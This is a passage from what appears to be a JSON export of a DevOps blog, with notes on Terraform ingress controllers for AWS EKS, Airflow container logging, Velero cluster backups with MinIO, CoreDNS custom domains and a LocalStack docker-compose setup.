\u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-proxy-protocol\u0026#34; 76 value = \u0026#34;*\u0026#34; 77 } 78 79 set { 80 type = \u0026#34;string\u0026#34; 81 name = \u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-backend-protocol\u0026#34; 82 value = \u0026#34;tcp\u0026#34; 83 } 84 85 set{ 86 type = \u0026#34;string\u0026#34; 87 name = \u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-ssl-ports\u0026#34; 88 value = \u0026#34;https\u0026#34; 89 } 90 91 set { 92 type = \u0026#34;string\u0026#34; 93 name = \u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-connection-idle-timeout\u0026#34; 94 value = \u0026#34;120\u0026#34; 95 } 96 97 set { 98 type = \u0026#34;string\u0026#34; 99 name = \u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-type\u0026#34; 100 value = \u0026#34;nlb\u0026#34; 101 } 102 103 set { 104 type = \u0026#34;string\u0026#34; 105 name = \u0026#34;controller.service.annotations.service\\\\.beta\\\\.kubernetes\\\\.io/aws-load-balancer-cross-zone-load-balancing-enabled\u0026#34; 106 value = \u0026#34;true\u0026#34; 107 } 108} Using Alb-ingress-controller in AWS Eks Every ingress should create application loadbalance it will cost a lot Alb-ingress controller need aws IAM policy to create ALB The ALB-ingress controller Terraform configurate 1\tresource \u0026#34;kubernetes_cluster_role\u0026#34; \u0026#34;ingress\u0026#34; { 2 metadata { 3 name = \u0026#34;alb-ingress-controller\u0026#34; 4 labels = { 5 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;alb-ingress-controller\u0026#34; 6 \u0026#34;app.kubernetes.io/managed-by\u0026#34; = \u0026#34;terraform\u0026#34; 7 } 8 } 9 10 rule { 11 api_groups = [\u0026#34;\u0026#34;, \u0026#34;extensions\u0026#34;] 12 resources = [\u0026#34;configmaps\u0026#34;, \u0026#34;endpoints\u0026#34;, \u0026#34;events\u0026#34;, \u0026#34;ingresses\u0026#34;, \u0026#34;ingresses/status\u0026#34;, \u0026#34;services\u0026#34;] 13 verbs = [\u0026#34;create\u0026#34;, \u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;patch\u0026#34;] 14 } 15 16 rule { 17 api_groups = [\u0026#34;\u0026#34;, \u0026#34;extensions\u0026#34;] 18 resources = [\u0026#34;nodes\u0026#34;, \u0026#34;pods\u0026#34;, \u0026#34;secrets\u0026#34;, \u0026#34;services\u0026#34;, \u0026#34;namespaces\u0026#34;] 19 verbs = [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;] 20 } 21 22 depends_on = [ 23 aws_eks_cluster.main 24 ] 25} 26 27resource \u0026#34;kubernetes_cluster_role_binding\u0026#34; \u0026#34;ingress\u0026#34; { 28 metadata { 29 name = \u0026#34;alb-ingress-controller\u0026#34; 30 labels = { 31 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;alb-ingress-controller\u0026#34; 32 \u0026#34;app.kubernetes.io/managed-by\u0026#34; = \u0026#34;terraform\u0026#34; 33 } 34 } 35 role_ref { 36 api_group = \u0026#34;rbac.authorization.k8s.io\u0026#34; 37 kind = \u0026#34;ClusterRole\u0026#34; 38 name = kubernetes_cluster_role.ingress.metadata[0].name 39 } 40 subject { 41 kind = \u0026#34;ServiceAccount\u0026#34; 42 name = kubernetes_service_account.ingress.metadata[0].name 43 namespace = kubernetes_service_account.ingress.metadata[0].namespace 44 } 45 46 depends_on = [ 47 aws_eks_cluster.main, 48 kubernetes_cluster_role.ingress 49 ] 50} 51 52resource \u0026#34;kubernetes_service_account\u0026#34; \u0026#34;ingress\u0026#34; { 53 automount_service_account_token = true 54 metadata { 55 name = \u0026#34;alb-ingress-controller\u0026#34; 56 namespace = \u0026#34;kube-system\u0026#34; 57 labels = { 58 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;alb-ingress-controller\u0026#34; 59 \u0026#34;app.kubernetes.io/managed-by\u0026#34; = \u0026#34;terraform\u0026#34; 60 } 61 annotations = { 62 \u0026#34;eks.amazonaws.com/role-arn\u0026#34; = aws_iam_role.eks_alb_ingress_controller.arn 63 } 64 } 65 66 depends_on = [ 67 aws_eks_cluster.main 68 ] 69} 70 71resource \u0026#34;kubernetes_deployment\u0026#34; \u0026#34;ingress\u0026#34; { 72 metadata { 73 name = \u0026#34;alb-ingress-controller\u0026#34; 74 namespace = \u0026#34;kube-system\u0026#34; 75 labels = { 76 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;alb-ingress-controller\u0026#34; 77 \u0026#34;app.kubernetes.io/version\u0026#34; = \u0026#34;v1.1.9\u0026#34; 78 \u0026#34;app.kubernetes.io/managed-by\u0026#34; = \u0026#34;terraform\u0026#34; 79 } 80 } 81 82 spec { 83 replicas = 1 84 85 selector { 86 match_labels = { 87 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;alb-ingress-controller\u0026#34; 88 } 89 } 90 91 template { 92 metadata { 93 labels = { 94 \u0026#34;app.kubernetes.io/name\u0026#34; = \u0026#34;alb-ingress-controller\u0026#34; 95 \u0026#34;app.kubernetes.io/version\u0026#34; = \u0026#34;v1.1.9\u0026#34; 96 } 97 } 98 99 spec { 100 dns_policy = \u0026#34;ClusterFirst\u0026#34; 101 restart_policy = \u0026#34;Always\u0026#34; 102 service_account_name = kubernetes_service_account.ingress.metadata[0].name 103 termination_grace_period_seconds = 60 104 105 container { 106 name = \u0026#34;alb-ingress-controller\u0026#34; 107 image = \u0026#34;docker.io/amazon/aws-alb-ingress-controller:v1.1.9\u0026#34; 108 image_pull_policy = \u0026#34;Always\u0026#34; 109 110 args = [ 111 \u0026#34;--ingress-class=alb\u0026#34;, 112 \u0026#34;--cluster-name=${aws_eks_cluster.main.id}\u0026#34;, 113 \u0026#34;--aws-vpc-id=${var.vpc_id}\u0026#34;, 114 \u0026#34;--aws-region=${var.region}\u0026#34;, 115 \u0026#34;--aws-max-retries=10\u0026#34;, 116 ] 117 118 volume_mount { 119 mount_path = \u0026#34;/var/run/secrets/kubernetes.io/serviceaccount\u0026#34; 120 name = kubernetes_service_account.ingress.default_secret_name 121 read_only = true 122 } 123 124 port { 125 name = \u0026#34;health\u0026#34; 126 container_port = 10254 127 protocol = \u0026#34;TCP\u0026#34; 128 } 129 130 readiness_probe { 131 http_get { 132 path = \u0026#34;/healthz\u0026#34; 133 port = \u0026#34;health\u0026#34; 134 scheme = \u0026#34;HTTP\u0026#34; 135 } 136 137 initial_delay_seconds = 30 138 period_seconds = 60 139 timeout_seconds = 3 140 } 141 142 liveness_probe { 143 http_get { 144 path = \u0026#34;/healthz\u0026#34; 145 port = \u0026#34;health\u0026#34; 146 scheme = \u0026#34;HTTP\u0026#34; 147 } 148 149 initial_delay_seconds = 60 150 period_seconds = 60 151 } 152 } 153 154 volume { 155 name = kubernetes_service_account.ingress.default_secret_name 156 157 secret { 158 secret_name = kubernetes_service_account.ingress.default_secret_name 159 } 160 } 161 } 162 } 163 } 164 165 depends_on = [ 166 kubernetes_cluster_role_binding.ingress, 167 aws_eks_cluster.main 168 ] 169} The Alb ingress resource should look likes following 1\tresource \u0026#34;kubernetes_ingress\u0026#34; \u0026#34;example_ingress\u0026#34; { 2 metadata { 3 name = \u0026#34;example-ingress\u0026#34; 4 namespace = \u0026#34;default\u0026#34; 5 annotations = { 6 \u0026#34;kubernetes.io/ingress.class\u0026#34; = \u0026#34;alb\u0026#34; 7 \u0026#34;alb.ingress.kubernetes.io/scheme\u0026#34; = \u0026#34;internet-facing\u0026#34; 8 \u0026#34;alb.ingress.kubernetes.io/target-type\u0026#34; = \u0026#34;instance\u0026#34; 9 \u0026#34;alb.ingress.kubernetes.io/listen-ports\u0026#34; = \u0026#34;[{\\\u0026#34;HTTPS\\\u0026#34;: 443},{\\\u0026#34;HTTP\\\u0026#34;: 80}]\u0026#34; 10 \u0026#34;alb.ingress.kubernetes.io/actions.ssl-redirect\u0026#34; = \u0026#34;{\\\u0026#34;Type\\\u0026#34;: \\\u0026#34;redirect\\\u0026#34;, \\\u0026#34;RedirectConfig\\\u0026#34;: { \\\u0026#34;Protocol\\\u0026#34;: \\\u0026#34;HTTPS\\\u0026#34;, \\\u0026#34;Port\\\u0026#34;: \\\u0026#34;443\\\u0026#34;, \\\u0026#34;StatusCode\\\u0026#34;: \\\u0026#34;HTTP_301\\\u0026#34;}}\u0026#34; 11 \u0026#34;alb.ingress.kubernetes.io/security-groups\u0026#34; = var.alb_security_group_ids 12 \u0026#34;alb.ingress.kubernetes.io/certificate-arn\u0026#34; = var.alb_certificates 13 \u0026#34;alb.ingress.kubernetes.io/healthcheck-path\u0026#34; = \u0026#34;/\u0026#34; 14 \u0026#34;alb.ingress.kubernetes.io/success-codes\u0026#34; = \u0026#34;200,201,302,301\u0026#34; 15 \u0026#34;alb.ingress.kubernetes.io/unhealthy-threshold-count\u0026#34; = \u0026#34;5\u0026#34; 16 } 17 } 18 spec { 19 rule { 20 host = var.web_dns_name 21 http { 22 path { 23 backend { 24 service_name = \u0026#34;ssl-redirect\u0026#34; 25 service_port = \u0026#34;use-annotation\u0026#34; 26 } 27 path = \u0026#34;/*\u0026#34; 28 } 29 path { 30 backend { 31 service_name = \u0026#34;example-web\u0026#34; 32 service_port = 80 33 } 34 path = \u0026#34;/*\u0026#34; 35 } 36 } 37 } 38 } 39} The Merge ingress it will only work if you create ingress in the same namespace The merge ingress helm chart need download to self github repo merge ingress 1resource \u0026#34;helm_release\u0026#34; \u0026#34;merge_ingress_controller\u0026#34; { 2 name = \u0026#34;merge-ingress\u0026#34; 3 chart = \u0026#34;${path.module}/../../../../charts/ingress-merge\u0026#34; 4 namespace = \u0026#34;kube-system\u0026#34; 5 } Should create merged_ingress configmap in every namespace if has ingress 1resource \u0026#34;kubernetes_config_map\u0026#34; \u0026#34;merged_ingress\u0026#34; { 2 metadata { 3 name = \u0026#34;merged-ingress\u0026#34; 4 namespace = \u0026#34;default\u0026#34; 5 } 6 7 data = { 8 annotations =\u0026lt;\u0026lt;DOC 9 \u0026#34;kubernetes.io/ingress.class\u0026#34;: \u0026#34;alb\u0026#34; 10 \u0026#34;alb.ingress.kubernetes.io/scheme\u0026#34;: \u0026#34;internet-facing\u0026#34; 11 \u0026#34;alb.ingress.kubernetes.io/target-type\u0026#34;: \u0026#34;instance\u0026#34; 12 \u0026#34;alb.ingress.kubernetes.io/listen-ports\u0026#34;: \u0026#34;[{\\\u0026#34;HTTPS\\\u0026#34;: 443},{\\\u0026#34;HTTP\\\u0026#34;: 80}]\u0026#34; 13 \u0026#34;alb.ingress.kubernetes.io/actions.ssl-redirect\u0026#34;: \u0026#34;{\\\u0026#34;Type\\\u0026#34;: \\\u0026#34;redirect\\\u0026#34;, \\\u0026#34;RedirectConfig\\\u0026#34;: { \\\u0026#34;Protocol\\\u0026#34;: \\\u0026#34;HTTPS\\\u0026#34;, \\\u0026#34;Port\\\u0026#34;: \\\u0026#34;443\\\u0026#34;, \\\u0026#34;StatusCode\\\u0026#34;: \\\u0026#34;HTTP_301\\\u0026#34;}}\u0026#34; 14 \u0026#34;alb.ingress.kubernetes.io/security-groups\u0026#34;: ${var.alb_security_group_ids} 15 \u0026#34;alb.ingress.kubernetes.io/certificate-arn\u0026#34;: ${var.alb_certificates} 16 \u0026#34;alb.ingress.kubernetes.io/healthcheck-path\u0026#34;: \u0026#34;/\u0026#34; 17 \u0026#34;alb.ingress.kubernetes.io/success-codes\u0026#34;: \u0026#34;200,201,302,301\u0026#34; 18 \u0026#34;alb.ingress.kubernetes.io/unhealthy-threshold-count\u0026#34;: \u0026#34;5\u0026#34; 19 DOC 20 } 21 } The ingress resource should be create in default namespace ","link":"https://blog.wisekee.com/post/kubernetes-ingress-guides/","section":"post","tags":["Terraform","Kubernetes","Featured"],"title":"Notes for using Kubernetes Ingress Controller"},{"body":"","link":"https://blog.wisekee.com/tags/airflow/","section":"tags","tags":null,"title":"Airflow"},{"body":"Problem description When use kubernetes executor in airflow, the dags not use the podOperator but that use PythonOperator, the console logs end of Running %s on host %s \u0026lt;TaskInstance:, then the task logs don\u0026rsquo;t redirect to stdout According to the Airflow descript need config the logging class: custom_log_settings Change the custom log settings comment relative code and enable to console the tee_file_task_handler.py edit the following code snippet.\ncomment the following content. 1\tif self.write_stdout: 2 # Task has finished running, write entire contents of log to stdout 3 # self.write_task_to_stdout() 4\t5 # def write_task_to_stdout(self): 6 # try: 7 # absolute_path = self.local_base + \u0026#39;/\u0026#39; + self.log_relative_path 8 # log_file = open(absolute_path, \u0026#34;r\u0026#34;) 9 # contents = log_file.read() 10 # except IOError: 11 # pass 12 13 # self.stream_handler.emit(logging.makeLogRecord({ 14 # \u0026#39;msg\u0026#39;: \u0026#34;*TASK_LOG*\\n\\n\u0026#34; + contents, 15 # \u0026#39;log_path\u0026#39;: absolute_path 16 # })) Override the emit method 1\tdef emit(self, record): 2 if self.handler: 3 self.handler.emit(record) 4 if self.stream_handler: 5 self.stream_handler.emit(record) The Airflow Dockerfile 1FROM apache/airflow:1.10.12-python3.6 2COPY ./requirements.txt ./requirements.txt 3RUN pip3 install -r requirements.txt --user 4#COPY --chown=airflow:airflow ./webserver_config.py /opt/airflow/ 5USER root 6RUN apt-get update -y 7 8# Define en_US. 9ENV LANGUAGE en_US.UTF-8 10ENV LANG en_US.UTF-8 11ENV LC_ALL en_US.UTF-8 12ENV LC_CTYPE en_US.UTF-8 13ENV LC_MESSAGES en_US.UTF-8 14 15# Disable noisy \u0026#34;Handling signal\u0026#34; log messages: 16# ENV GUNICORN_CMD_ARGS --log-level WARNING 17 18#RUN sed -i \u0026#39;s#http://deb.debian.org#https://mirrors.aliyun.com#g\u0026#39; /etc/apt/sources.list 19RUN apt-get install apt-transport-https 20 21# JVM installation needs man folder 22RUN mkdir -p /usr/share/man/man1 23 24RUN rm -rf /var/lib/apt/lists/* \\ 25 \u0026amp;\u0026amp; apt-get clean \\ 26 \u0026amp;\u0026amp; apt-get update -yqq \\ 27 \u0026amp;\u0026amp; apt-get upgrade -yqq \\ 28 \u0026amp;\u0026amp; apt-get install software-properties-common -y \\ 29 \u0026amp;\u0026amp; apt-get install zip unzip -y \\ 30 \u0026amp;\u0026amp; apt-get install -yqq --no-install-recommends \\ 31 curl \\ 32 locales \\ 33 \u0026amp;\u0026amp; sed -i \u0026#39;s/^# en_US.UTF-8 UTF-8$/en_US.UTF-8 UTF-8/g\u0026#39; /etc/locale.gen \\ 34 \u0026amp;\u0026amp; locale-gen \\ 35 \u0026amp;\u0026amp; update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 \\ 36# \u0026amp;\u0026amp; apt-get purge --auto-remove -yqq $buildDeps \\ 37 \u0026amp;\u0026amp; apt-get autoremove -yqq --purge \\ 38 \u0026amp;\u0026amp; apt-get clean 39 40RUN mkdir -p /opt/airflow/config 41COPY ./pymysql_config.py /opt/airflow/config/ 42ENV AIRFLOW__CORE__SQL_ALCHEMY_CONNECT_ARGS=pymysql_config.CONNECT_ARGS 43 44USER airflow 45 46COPY config ${AIRFLOW_USER_HOME_DIR}/config 47ENV PYTHONPATH \u0026#34;${PYTHONPATH}:${AIRFLOW_USER_HOME_DIR}\u0026#34; Configure PythonOperator environtment parameters Specification the envs where the custom logging class and format\n1executor_config={ 2 \u0026#34;KubernetesExecutor\u0026#34;: { 3 \u0026#34;labels\u0026#34;: { 4 \u0026#34;task_id\u0026#34;: task[\u0026#34;task_id\u0026#34;] 5 }, 6 \u0026#34;image\u0026#34;: image, 7 \u0026#34;resources\u0026#34;: pod_resources, 8 \u0026#34;envs\u0026#34;: { 9 \u0026#34;TZ\u0026#34;: time_zone, 10 \u0026#34;AIRFLOW__CORE__LOGGING_CONFIG_CLASS\u0026#34;: \u0026#34;config.airflow_custom_log_settings.CONFIG\u0026#34;, 11 \u0026#34;AIRFLOW__STDOUT__JSON_FORMAT\u0026#34;: \u0026#34;true\u0026#34;, 12 \u0026#34;AIRFLOW__STDOUT__WRITE_STDOUT\u0026#34;: \u0026#34;true\u0026#34;, 13 \u0026#34;AIRFLOW__STDOUT__JSON_FIELDS\u0026#34;: \u0026#34;log_path, message\u0026#34; 14 } 15 } 16 } ","link":"https://blog.wisekee.com/post/airflow-kuberntes-logs-config/","section":"post","tags":["Airflow","K8s","Cloud"],"title":"Airflow console logs display in kuberntes container executor"},{"body":"","link":"https://blog.wisekee.com/tags/cloud/","section":"tags","tags":null,"title":"Cloud"},{"body":"The Metrics-Server helm chart as Terraform HCL 1resource \u0026#34;helm_release\u0026#34; \u0026#34;metrics-server\u0026#34; { 2 name = \u0026#34;metrics-server\u0026#34; 3 repository = \u0026#34;https://charts.bitnami.com/bitnami\u0026#34; 4 chart = \u0026#34;metrics-server\u0026#34; 5 version = \u0026#34;4.1.4\u0026#34; 6 namespace = \u0026#34;kube-system\u0026#34; 7 8 set { 9 name = \u0026#34;extraArgs.kubelet-preferred-address-types\u0026#34; 10 value = \u0026#34;InternalIP\\\\,ExternalIP\\\\,Hostname\u0026#34; 11 } 12 13 set { 14 name = \u0026#34;resources.requests.memory\u0026#34; 15 value = \u0026#34;500Mi\u0026#34; 16 } 17 18 set { 19 name = \u0026#34;resources.limits.memory\u0026#34; 20 value = \u0026#34;1Gi\u0026#34; 21 } 22 23 set { 24 name = \u0026#34;apiService.create\u0026#34; 25 value = \u0026#34;true\u0026#34; 26 } 27 28} The apiService.create always assign to true when in AWS EKS or other kubernetes distribution The values include comma , muste be use escape in terraform Any resources should be specific quota, like resource requests and limits When Name includes dot annotations also escaped 1# set { 2# type = \u0026#34;string\u0026#34; 3# name = \u0026#34;ingress.web.annotations.alb\\\\.ingress\\\\.kubernetes\\\\.io/security-groups\u0026#34; 4# value = \u0026#34;${var.office_sg_id}\\\\,${var.internal_sg_id}\\\\,${var.cluster_sg_id}\u0026#34; 5# } terraform helm release use local charts 1resource \u0026#34;helm_release\u0026#34; \u0026#34;fluentd_server\u0026#34; { 2 name = \u0026#34;fluentd-server\u0026#34; 3 # repository = \u0026#34;https://charts.bitnami.com/bitnami\u0026#34; 4 chart = \u0026#34;${path.module}/../../../../../charts/fluentd\u0026#34; 5 version = \u0026#34;3.1.0\u0026#34; 6 namespace = \u0026#34;kube-system\u0026#34; 7 8 values = [ 9 \u0026lt;\u0026lt;-EOF 10 forwarder: 11 configMap: \u0026#34;fluentd-forwarder-config\u0026#34; 12 rbac: 13 pspEnabled: true 14 resources: 15 limits: 16 memory: 1Gi 17 requests: 18 memory: 512Mi 19 aggregator: 20 replicaCount: 1 21 configMap: \u0026#34;fluentd-elasticsearch-config\u0026#34; 22 resources: 23 limits: 24 memory: 1Gi 25 requests: 26 memory: 512Mi 27 extraEnv: 28 - name: ELASTICSEARCH_HOST 29 value: \u0026#34;${var.es_url}\u0026#34; 30 - name: ELASTICSEARCH_PORT 31 value: \u0026#34;80\u0026#34; 32 - name: ELASTICSEARCH_SCHEME 33 value: \u0026#34;http\u0026#34; 34 persistence: 35 enabled: true 36 storageClass: gp2 37 EOF 38 ] 39 40 depends_on = [ 41 kubernetes_config_map.fluentd_elasticsearch_output, 42 kubernetes_config_map.fluentd_forwarder_config 43 ] 44 45} ","link":"https://blog.wisekee.com/post/terraform-helm-issues/","section":"post","tags":["Terraform","K8s","Featured"],"title":"Points to note about  Terraform helm provider"},{"body":"Installing or Upgrade Velero client on Mac OS:\n1\tbrew install velero 2\tHOMEBREW_NO_AUTO_UPDATE=1 brew upgrade velero #upgrade to the latest version if maybe The Velero should use object store save the snapshot. so we use Minio as kubernetes object store.Minio launched as part of docker-compose.yaml\n1\tminio: 2 container_name: \u0026#34;minio\u0026#34; 3 image: minio/minio 4 command: \u0026#34;server /data\u0026#34; 5 ports: 6 - \u0026#34;9000:9000\u0026#34; 7 environment: 8 MINIO_ACCESS_KEY: “xxxxxxx” 9 MINIO_SECRET_KEY: “xxxxxxx” 10 volumes: 11 - \u0026#34;./minio/data:/data\u0026#34; 12 networks: 13 - easy-mock Create a env file is named: velero-env. because the Velero need the similar aws credentials access to Minio service storage backup object.\n1\t[default] 2\taws_access_key_id = xxxxxx 3\taws_secret_access_key = xxxxxx if you setup Velero before. maybe delete custom resource definitions in k8s:\n1#such as 2\tkubectl delete crd velero.io/* 3\tkubectl delete all --all -n velero Execute velero server end install command:\n1\tvelero install \\ 2 --provider aws \\ 3 --plugins velero/velero-plugin-for-aws:v1.0.0 \\ 4 --bucket local-backup \\ 5 --secret-file ./velero-env \\ 6 --use-volume-snapshots=true \\ 7 --backup-location-config region=minio,s3ForcePathStyle=\u0026#34;true\u0026#34;,s3Url=http://example.local.com:9000 \\ 8 --snapshot-location-config region=minio \\ 9 --use-restic=true the velero install command can repeat execute. when was problem\nusually the velero command example:\n1\tvelero create backup k8s-all-backup # creae backup 2\tvelero backup describe k8s-all-backup # view detail 3\tvelero backup logs k8s-all-backup # view logs 4\t#schedule backups 5\tvelero schedule create k8s-all-backup --schedule \u0026#34;0 0 * * *\u0026#34; 6\t7\t# specific annotations for resources backup snapshot 8\tkubectl -n kube-system annotate pod/etcd-master backup.velero.io/backup-volumes=etcd-certs,etcd-data 9\tvelero backup create etcd-master-backup-with-pv --include-namespaces kube-system 10 11\tvelero backup describe etcd-master-backup-with-pv 12\tvelero backup logs etcd-master-backup-with-pv 13 14\tkubectl -n kubesphere-system annotate pod/mysql-66df969d-wx8z9 backup.velero.io/backup-volumes=db-persistent-storage 15\tvelero backup create kubesphere-mysql-backup-with-pv --include-namespaces kubesphere-system 16# you can also specific snapshot locations 17# 18\tvelero snapshot-location create office-minio --provider aws --config region=minio 19\tvelero backup create kubesphere-mysql-backup-with-pv --include-namespaces kubesphere-system --volume-snapshot-locations office-minio 20\tvelero schedule create kubesphere-system-all-backup --schedule \u0026#34;0 0 * * *\u0026#34; --volume-snapshot-locations office-minio testing backup and restore 1\tkubectl create ns test # create namespace 2\thelm install nginx apphub/nginx -n test # install example resource nginx 3\tvelero backup create nginx-backup --include-namespaces test 4\tkubectl delete namespaces test # delete test namespace include all restource 5\tvelero restore create --from-backup nginx-backup 6\tvelero restore describe nginx-backup-20200914164752 # veiw detail 7\tvelero restore get # the status is Completed. You can also using Helm chart install Velero server end. the Helm repo looks like following:\n1\thelm repo add vmware-tanzu https://vmware-tanzu.github.io/helm-charts # add repo 2\t## other some repo if testing in local. 3\t#apphub https://apphub.aliyuncs.com/ 4\t#vmware-tanzu https://vmware-tanzu.github.io/helm-charts 5\t#harbor https://helm.goharbor.io 6\t#choerodon https://openchart.choerodon.com.cn/choerodon/c7n 7\t#rancher-latest\thttps://releases.rancher.com/server-charts/latest 8\t#jetstack https://charts.jetstack.io 9\t#nuclio https://nuclio.github.io/nuclio/charts 10\t#bitnami https://charts.bitnami.com/bitnami reference to: https://github.com/vmware-tanzu/helm-charts/blob/main/charts/velero/README.md\nbackup kubernetes master etcd snapshot and pki files 1#!/usr/bin/env bash 2sudo cp -r /etc/kubernetes/pki ./backup/ 3sudo docker run --rm -v /data1/k8s/backup:/backup \\ 4 --network host \\ 5 -v /etc/kubernetes/pki/etcd:/etc/kubernetes/pki/etcd \\ 6 --env ETCDCTL_API=3 \\ 7 registry.aliyuncs.com/google_containers/etcd:3.4.3-0 \\ 8 etcdctl --endpoints=https://127.0.0.1:2379 \\ 9 --cacert=/etc/kubernetes/pki/etcd/ca.crt \\ 10 --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \\ 11 --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \\ 12 snapshot save ./backup/etcd-snapshot-latest.db use helm install velero server and backup aws EKS first install velero Helm chat use terraform 1resource \u0026#34;kubernetes_namespace\u0026#34; \u0026#34;velero-system\u0026#34; { 2 metadata { 3 annotations = { 4 name = \u0026#34;velero-system\u0026#34; 5 } 6 name = \u0026#34;velero-system\u0026#34; 7 } 8} 9 10resource \u0026#34;helm_release\u0026#34; \u0026#34;velero\u0026#34; { 11 name = \u0026#34;velero\u0026#34; 12 chart = \u0026#34;../../charts/velero\u0026#34; 13 namespace = kubernetes_namespace.velero-system.metadata.0.name 14 15 values = [ 16 \u0026lt;\u0026lt;-EOF 17 configuration: 18 backupStorageLocation: 19 bucket: \u0026#34;${local.velero.bucket}\u0026#34; 20 prefix: \u0026#34;${local.velero.prefix}\u0026#34; 21 provider: aws 22 volumeSnapshotLocation: 23 name: aws-volumesnapshot 24 provider: aws 25 config: 26 region: \u0026#34;${local.region}\u0026#34; 27 credentials: 28 useSecret: false 29 initContainers: 30 - name: velero-plugin-for-aws 31 image: velero/velero-plugin-for-aws:v1.2.0 32 volumeMounts: 33 - mountPath: /target 34 name: plugins 35 EOF 36 ] 37 38 depends_on = [ 39 kubernetes_namespace.velero-system 40 ] 41} second use velero client command operation backup and restore because velero not have install default namespace, so need -n parameter refer to namespace 1# check version client and server 2velero version -n velero-system 3# get backup 4velero backup get -n velero-system 5# get backup locaction 6velero backup-location get -n velero-system 7# create backup 8velero backup create 2022-12-28-backup -n velero-system 9# view backup logs 10velero backup logs 2022-12-28-backup -n velero-system 11# delete backup 12velero backup delete 2022-12-28-backup -n velero-system 13# backup full eks cluster and refer to snapshot : 14velero backup create 2023-2-3-backup-02 -n backup-system --snapshot-volumes ","link":"https://blog.wisekee.com/post/k8s-backup-restore-using-velero/","section":"post","tags":["Kubernetes","Velero","K8s"],"title":"Backup and Restore kubernetes cluster using Velero"},{"body":"","link":"https://blog.wisekee.com/tags/velero/","section":"tags","tags":null,"title":"Velero"},{"body":"","link":"https://blog.wisekee.com/tags/coredons/","section":"tags","tags":null,"title":"Coredons"},{"body":"We use default service domain name ${servicename}.${namespace}.svc.cluster.localin kubernetes cluster, however the custom private domain name in private k8s networks frequently used. we can use coredns component reparse the private domain name to default CNAME.\nchange coredns configmap add custom domain name config to yaml kubectl edit cm coredns -n kube-system\n1data: 2 Corefile: | 3 .:53 { 4 errors 5 health { 6 lameduck 5s 7 } 8 ready 9 kubernetes cluster.local in-addr.arpa ip6.arpa { 10 pods insecure 11 fallthrough in-addr.arpa ip6.arpa 12 ttl 30 13 } 14 file /etc/coredns/uat-env.db uat-env.com 15 prometheus :9153 16 forward . /etc/resolv.conf 17 cache 30 18 loop 19 reload 20 loadbalance 21 } 22 uat-env.db: \u0026gt;- 23 uat-env.com. IN SOA ns.dns.cluster.local. 24 hostmaster.cluster.local. 1592362202 7200 1800 86400 30 25 26 uat-env.com. IN NS 27 kube-dns.kube-system.svc.cluster.local. 28 29 db.uat-env.com. IN CNAME 30 mysql.db.svc.cluster.local. 31 32 private-services.uat-env.com. IN CNAME 33 internal-gateway.default.svc.cluster.local. add file /etc/coredns/uat-env.db uat-env.com line to Corefile section add new section uat-env.db and add relative recordset\nChange coredns deployment configure in kube-system namespace kubectl edit deployment coredns -n kube-system under config-volume section in volumes section add an item, looks like this\n1items: 2 - key: Corefile 3 path: Corefile 4 - key: uat-env.db 5 path: uat-env.db that\u0026rsquo;s all, enjoy it.\n1# test it 2dig db.uat-env.com 3curl http://private-services.uat-env.com ","link":"https://blog.wisekee.com/post/custom-domain-name-in-k8s/","section":"post","tags":["kubernetes","Coredons"],"title":"Custom private domain name in kubernetes cluster"},{"body":"","link":"https://blog.wisekee.com/tags/localstack/","section":"tags","tags":null,"title":"LocalStack"},{"body":"When you develop components locally that rely on AWS, it can be cumbersome to configure authentication information, and sometimes network latency. It is important to mock with a native AWS component, which can:localstack I\u0026rsquo;m using Docker-Compose here to start a set of tools that local development depends on：\nThe docker-compose.yml looks like this following 1version: \u0026#39;3\u0026#39; 2 3services: 4 mongodb: 5 image: mongo:3.4.1 6 volumes: 7 - \u0026#39;./easymock/data/db:/data/db\u0026#39; 8 networks: 9 - easy-mock 10 ports: 11 - \u0026#34;27017:27017\u0026#34; 12 restart: always 13 container_name: mongodb 14 15 redis: 16 image: redis:4.0.6 17 command: redis-server --appendonly yes 18 volumes: 19 - \u0026#39;./easymock/data/redis:/data\u0026#39; 20 networks: 21 - easy-mock 22 restart: always 23 container_name: redis 24 25 localstack: 26 container_name: \u0026#34;${LOCALSTACK_DOCKER_NAME-localstack}\u0026#34; 27 image: localstack/localstack 28 ports: 29 - \u0026#34;4567-4597:4567-4597\u0026#34; 30 environment: 31 - DEBUG=${DEBUG-true} 32 - DATA_DIR=${DATA_DIR-/tmp/localstack/data} 33 - PORT_WEB_UI=${PORT_WEB_UI-8080} 34 - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR-docker-reuse} 35 - DOCKER_HOST=unix:///var/run/docker.sock 36 - HOSTNAME_EXTERNAL=awsmock.local-dev.com 37 volumes: 38 - \u0026#34;./localstack/data:/tmp/localstack\u0026#34; 39 - \u0026#34;/var/run/docker.sock:/var/run/docker.sock\u0026#34; 40 networks: 41 - easy-mock 42 43 mysql: 44 container_name: \u0026#34;mysql\u0026#34; 45 image: mysql 46 command: \u0026#34;--default-authentication-plugin=mysql_native_password --skip-mysqlx\u0026#34; 47 ports: 48 - \u0026#34;3306:3306\u0026#34; 49 environment: 50 MYSQL_ROOT_PASSWORD: \u0026#34;xxxxx\u0026#34; 51 MYSQL_DATABASE: \u0026#34;awsmock\u0026#34; 52 MYSQL_PASSWORD: \u0026#34;xxxxx\u0026#34; 53 MYSQL_USER: \u0026#34;user\u0026#34; 54 volumes: 55 - \u0026#34;./mysql:/var/lib/mysql\u0026#34; 56 networks: 57 - easy-mock 58 59networks: 60 easy-mock: you should create relative folder such as: 